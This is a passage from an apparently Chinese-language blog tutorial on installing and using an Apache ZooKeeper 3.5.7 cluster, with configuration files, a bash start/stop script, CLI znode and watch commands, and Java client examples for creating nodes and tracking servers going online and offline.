Leader和Follower之间通信时间如果超过syncLimit * tickTime，Leader认为Follwer死掉，从服务器列表中删除Follwer</span></span><br><span class="line">syncLimit=5</span><br><span class="line"><span class="comment"># 保存Zookeeper中的数据</span></span><br><span class="line"><span class="comment"># 注意：默认的tmp目录，容易被Linux系统定期删除，所以一般不用默认的tmp目录。</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 客户端连接端口，通常不做修改</span></span><br><span class="line">clientPort=2181</span><br></pre></td></tr></table></figure><h2 id="2、集群部署">2、集群部署</h2><h3 id="2-1-集群安装">2.1 集群安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 hadoop102、hadoop103 和 hadoop104 三个节点上都部署 Zookeeper（这是之前hadoop集群用的）</span></span><br><span class="line"><span class="comment"># 在 hadoop102 解压 Zookeeper 安装包到/opt/module/目录下</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="built_in">cd</span> /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置修改=============</span></span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/这个目录上创建 zkData 文件夹</span></span><br><span class="line">mkdir zkData</span><br><span class="line"><span class="comment"># 在/opt/module/zookeeper-3.5.7/zkData 目录下创建一个 myid 的文件</span></span><br><span class="line"><span class="comment"># 在文件中添加与 server 对应的编号（注意：上下不要有空行，左右不要有空格）</span></span><br><span class="line"><span class="comment"># 这里编写一个2，注意：添加 myid 文件，一定要在 Linux 里面创建，在 notepad++里面很可能乱码</span></span><br><span class="line">vi myid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置好的 zookeeper 到其他机器上，分发脚本可以想见之前hadooop3.x学习笔记文章</span></span><br><span class="line">xsync zookeeper-3.5.7</span><br><span class="line"><span class="comment"># 并分别在 hadoop103、hadoop104 上修改 myid 文件中内容为 3、4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============配置zoo.cfg文件============</span></span><br><span class="line"><span class="comment"># 重命名/opt/module/zookeeper-3.5.7/conf 这个目录下的 zoo_sample.cfg 为 zoo.cfg</span></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">vim zoo.cfg</span><br><span class="line"><span class="comment"># 修改数据存储路径配置</span></span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="comment"># 增加如下配置</span></span><br><span class="line"><span class="comment">#######################cluster##########################</span></span><br><span class="line">server.2=hadoop102:2888:3888</span><br><span class="line">server.3=hadoop103:2888:3888</span><br><span class="line">server.4=hadoop104:2888:3888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置参数解读</span></span><br><span class="line"><span class="comment"># server.A=B:C:D</span></span><br><span class="line"><span class="comment"># A 是一个数字，表示这个是第几号服务器；集群模式下配置一个文件myid，这个文件在 dataDir 目录下，这个文件里面有一个数据就是 A 的值，</span></span><br><span class="line"><span class="comment"># Zookeeper 启动时读取此文件，拿到里面的数据与 zoo.cfg 里面的配置信息比较从而判断到底是哪个 server。</span></span><br><span class="line"><span class="comment"># B 是这个服务器的地址；</span></span><br><span class="line"><span class="comment"># C 是这个服务器Follower 与集群中的 Leader 服务器交换信息的端口；</span></span><br><span class="line"><span class="comment"># D 是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的Leader，而这个端口就是用来执行选举时服务器相互通信的端口。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步zoo.cfg 配置文件</span></span><br><span class="line">xsync zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================集群操作====================</span></span><br><span class="line"><span class="comment"># 分别三台机器启动Zookeeper</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">bin/zkServer.sh status</span><br></pre></td></tr></table></figure><h3 id="2-2-选举机制-面试重点">2.2 选举机制(面试重点)</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817886.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817887.png" alt></p><h3 id="2-3-ZK-集群启动停止脚本">2.3 ZK 集群启动停止脚本</h3><p>在 hadoop102 的/home/atguigu/bin 目录下创建脚本： <code>vim zk.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line"><span class="string">"start"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 启动 ------------</span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh start"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"stop"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 停止 ------------ </span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="string">"status"</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> ---------- zookeeper <span class="variable">$i</span> 状态 ------------ </span><br><span class="line">  ssh <span class="variable">$i</span> <span class="string">"/opt/module/zookeeper-3.5.7/bin/zkServer.sh status"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 增加脚本执行权限</span></span><br><span class="line">chmod u+x zk.sh</span><br><span class="line">zk.sh start</span><br><span class="line">zk.sh stop</span><br></pre></td></tr></table></figure><h1>三、ZK客户端相关操作</h1><h2 id="1、客户端命令行操作">1、客户端命令行操作</h2><h3 id="1-1-命令行语法">1.1 命令行语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动客户端</span></span><br><span class="line">bin/zkCli.sh -server hadoop102:2181</span><br><span class="line"><span class="comment"># 显示所有操作命令</span></span><br><span class="line"><span class="built_in">help</span></span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>命令基本语法</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td>help</td><td>显示所有操作命令</td></tr><tr><td>ls path</td><td>使用 ls 命令来查看当前 znode 的子节点 [可监听]-w 监听子节点变化-s 附加次级信息</td></tr><tr><td>create</td><td>普通创建-s 含有序列-e 临时（重启或者超时消失）</td></tr><tr><td>get path</td><td>获得节点的值 [可监听]-w 监听节点内容变化-s 附加次级信息</td></tr><tr><td>set</td><td>设置节点的具体值</td></tr><tr><td>stat</td><td>查看节点状态</td></tr><tr><td>delete</td><td>删除节点</td></tr><tr><td>deleteall</td><td>递归删除节点</td></tr></tbody></table><h3 id="1-2-znode-节点数据信息">1.2 znode 节点数据信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前znode中所包含的内容</span></span><br><span class="line">ls / </span><br><span class="line"><span class="comment"># 查看当前节点详细数据</span></span><br><span class="line">ls -s /</span><br></pre></td></tr></table></figure><ul><li><strong>czxid：创建节点的事务 zxid</strong>。每次修改ZooKeeper 状态都会产生一个ZooKeeper 事务 ID。事务 ID 是ZooKeeper 中所有修改总的次序。每次修改都有唯一的 zxid，如果 zxid1 小于 zxid2，那么zxid1 在 zxid2 之前发生。</li><li>ctime：znode 被创建的毫秒数（从 1970 年开始）</li><li>mzxid：znode 最后更新的事务zxid</li><li>mtime：znode 最后修改的毫秒数（从 1970 年开始）</li><li>pZxid：znode 最后更新的子节点zxid</li><li>cversion：znode 子节点变化号，znode 子节点修改次数</li><li><strong>dataversion：znode 数据变化号</strong></li><li>aclVersion：znode 访问控制列表的变化号</li><li>ephemeralOwner：如果是临时节点，这个是 znode 拥有者的 session id。如果不是临时节点则是 0</li><li>dataLength：znode 的数据长度</li><li>numChildren：znode 子节点数量</li></ul><h3 id="1-3-节点类型-持久-短暂-有序号-无序号">1.3 节点类型(持久/短暂/有序号/无序号)</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817888.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分别创建2个普通节点（永久节点 + 不带序号）</span></span><br><span class="line"><span class="comment"># 注意：创建节点时，要赋值</span></span><br><span class="line">create /sanguo <span class="string">"diaochan"</span></span><br><span class="line">create /sanguo/shuguo <span class="string">"liubei"</span></span><br><span class="line"><span class="comment"># 获得节点的值</span></span><br><span class="line">get -s /sanguo</span><br><span class="line">get -s /sanguo/shuguo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带序号的节点（永久节点 + 带序号）</span></span><br><span class="line"><span class="comment"># 先创建一个普通的根节点/sanguo/weiguo</span></span><br><span class="line">create /sanguo/weiguo <span class="string">"caocao"</span></span><br><span class="line"><span class="comment"># 创建带序号的节点</span></span><br><span class="line">create -s /sanguo/weiguo/zhangliao <span class="string">"zhangliao"</span></span><br><span class="line"><span class="comment"># 重复编号会增加</span></span><br><span class="line">create -s /sanguo/weiguo/zhangliao <span class="string">"zhangliao"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建短暂节点（短暂节点 + 不带序号 or 带序号）</span></span><br><span class="line"><span class="comment"># 创建短暂的不带序号的节点</span></span><br><span class="line">create -e /sanguo/wuguo <span class="string">"zhouyu"</span></span><br><span class="line"><span class="comment"># 创建短暂的带序号的节点</span></span><br><span class="line">create -e -s /sanguo/wuguo <span class="string">"zhouyu"</span></span><br><span class="line"><span class="comment"># 在当前客户端是能查看到的</span></span><br><span class="line">ls /sanguo</span><br><span class="line"><span class="comment"># 退出当前客户端然后再重启客户端</span></span><br><span class="line">quit</span><br><span class="line">bin/zkCli.sh</span><br><span class="line"><span class="comment"># 再次查看根目录下短暂节点已经删除</span></span><br><span class="line">ls /sanguo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改节点数据值</span></span><br><span class="line"><span class="built_in">set</span> /sanguo/weiguo <span class="string">"simayi"</span></span><br></pre></td></tr></table></figure><h3 id="1-4-节点删除与查看">1.4 节点删除与查看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除节点</span></span><br><span class="line">delete /sanguo/jin</span><br><span class="line"><span class="comment"># 递归删除节点</span></span><br><span class="line">deleteall /sanguo/shuguo</span><br><span class="line"><span class="comment"># 查看节点状态</span></span><br><span class="line"><span class="built_in">stat</span> /sanguo</span><br></pre></td></tr></table></figure><h2 id="2、监听器原理">2、监听器原理</h2><blockquote><p>客户端注册监听它关心的目录节点，当目录节点发生变化（数据改变、节点删除、子目录节点增加删除）时，ZooKeeper 会通知客户端。监听机制保证 ZooKeeper 保存的任何的数据的任何改变都能快速的响应到监听了该节点的应用程序</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817889.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 节点的值变化监听</span></span><br><span class="line"><span class="comment"># 在 hadoop104 主机上注册监听/sanguo 节点数据变化</span></span><br><span class="line">get -w /sanguo</span><br><span class="line"><span class="comment"># 在 hadoop103 主机上修改/sanguo 节点的数据</span></span><br><span class="line"><span class="comment"># 观察 hadoop104 主机收到数据变化的监听</span></span><br><span class="line"><span class="built_in">set</span> /sanguo <span class="string">"xisi"</span></span><br><span class="line"><span class="comment"># 注意：在hadoop103再多次修改/sanguo的值，hadoop104上不会再收到监听。因为注册一次，只能监听一次。想再次监听，需要再次注册</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点的子节点变化监听（路径变化）</span></span><br><span class="line"><span class="comment"># 在 hadoop104 主机上注册监听/sanguo 节点的子节点变化</span></span><br><span class="line">ls -w /sanguo</span><br><span class="line"><span class="comment"># 在 hadoop103 主机/sanguo 节点上创建子节点</span></span><br><span class="line"><span class="comment"># create /sanguo/jin "simayi"</span></span><br><span class="line">create /sanguo/jin <span class="string">"simayi"</span></span><br></pre></td></tr></table></figure><h2 id="3、客户端-API-操作">3、客户端 API 操作</h2><blockquote><p>前提：保证 hadoop102、hadoop103、hadoop104 服务器上 Zookeeper 集群服务端启动</p></blockquote><p>创建zookeeper工程，引入对应依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要在项目的 src/main/resources 目录下，新建一个文件，命名为&quot;log4j.properties&quot;，填入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log4j.rootLogger&#x3D;INFO, stdout  </span><br><span class="line">log4j.appender.stdout&#x3D;org.apache.log4j.ConsoleAppender  </span><br><span class="line">log4j.appender.stdout.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.stdout.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n  </span><br><span class="line">log4j.appender.logfile&#x3D;org.apache.log4j.FileAppender  </span><br><span class="line">log4j.appender.logfile.File&#x3D;target&#x2F;spring.log  </span><br><span class="line">log4j.appender.logfile.layout&#x3D;org.apache.log4j.PatternLayout  </span><br><span class="line">log4j.appender.logfile.layout.ConversionPattern&#x3D;%d %p [%c] - %m%n</span><br></pre></td></tr></table></figure><p>创建包名com.atguigu.zk，创建类名称zkClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zkClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：逗号左右不能有空格</span></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zkClient;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建 ZooKeeper 客户端</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        zkClient = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//                System.out.println("-------------------------------");</span></span><br><span class="line"><span class="comment">//                List&lt;String&gt; children = null;</span></span><br><span class="line"><span class="comment">//                try &#123;</span></span><br><span class="line"><span class="comment">//                    children = zkClient.getChildren("/", true);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                    for (String child : children) &#123;</span></span><br><span class="line"><span class="comment">//                        System.out.println(child);</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                    System.out.println("-------------------------------");</span></span><br><span class="line"><span class="comment">//                &#125; catch (KeeperException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125; catch (InterruptedException e) &#123;</span></span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建子节点</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 参数 1：要创建的节点的路径； 参数 2：节点数据 ； 参数 3：节点权限 ；参数 4：节点的类型</span></span><br><span class="line">        String nodeCreated = zkClient.create(<span class="string">"/atguigu"</span>, <span class="string">"ss.avi"</span>.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取子节点并监听节点变化</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getChildren</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        List&lt;String&gt; children = zkClient.getChildren(<span class="string">"/"</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String child : children) &#123;</span><br><span class="line">            System.out.println(child);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 延时</span></span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exist</span><span class="params">()</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">// 判断 Znode 是否存在</span></span><br><span class="line">        Stat stat = zkClient.exists(<span class="string">"/atguigu"</span>, <span class="keyword">false</span>);</span><br><span class="line">        System.out.println(stat==<span class="keyword">null</span>? <span class="string">"not exist "</span> : <span class="string">"exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、客户端向服务端写数据流程">4、客户端向服务端写数据流程</h2><p>写流程之写入请求直接发送给Leader节点(写完半数即可返回成功)</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817890.png" alt></p><p>写流程之写入请求发送给follower节点</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817891.png" alt></p><h1>四、ZK生产环境案例</h1><h2 id="1、服务器动态上下线监听案例">1、服务器动态上下线监听案例</h2><h3 id="1-1-需求分析">1.1 需求分析</h3><p>某分布式系统中，主节点可以有多台，可以动态上下线，任意一台客户端都能实时感知到主节点服务器的上下线。</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817892.png" alt></p><h3 id="1-2-具体实现">1.2 具体实现</h3><p>首先在集群上创建/serves节点 <code>create /servers &quot;servers&quot;</code></p><p>在 Idea 中创建包名：com.atguigu.zkcase1，创建服务端DistributeServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributeServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String connectString = <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, KeeperException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        DistributeServer server = <span class="keyword">new</span> DistributeServer();</span><br><span class="line">        <span class="comment">// 1 获取zk连接</span></span><br><span class="line">        server.getConnect();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 注册服务器到zk集群</span></span><br><span class="line">        server.regist(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 启动业务逻辑（睡觉）</span></span><br><span class="line">        server.business();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">business</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">regist</span><span class="params">(String hostname)</span> <span class="keyword">throws</span> KeeperException, InterruptedException </span>&#123;</span><br><span class="line">        String create = zk.create(<span class="string">"/servers/"</span>+hostname, hostname.getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line"></span><br><span class="line">        System.out.println(hostname +<span class="string">" is online"</span>) ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span> Watcher() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent watchedEvent)</span> 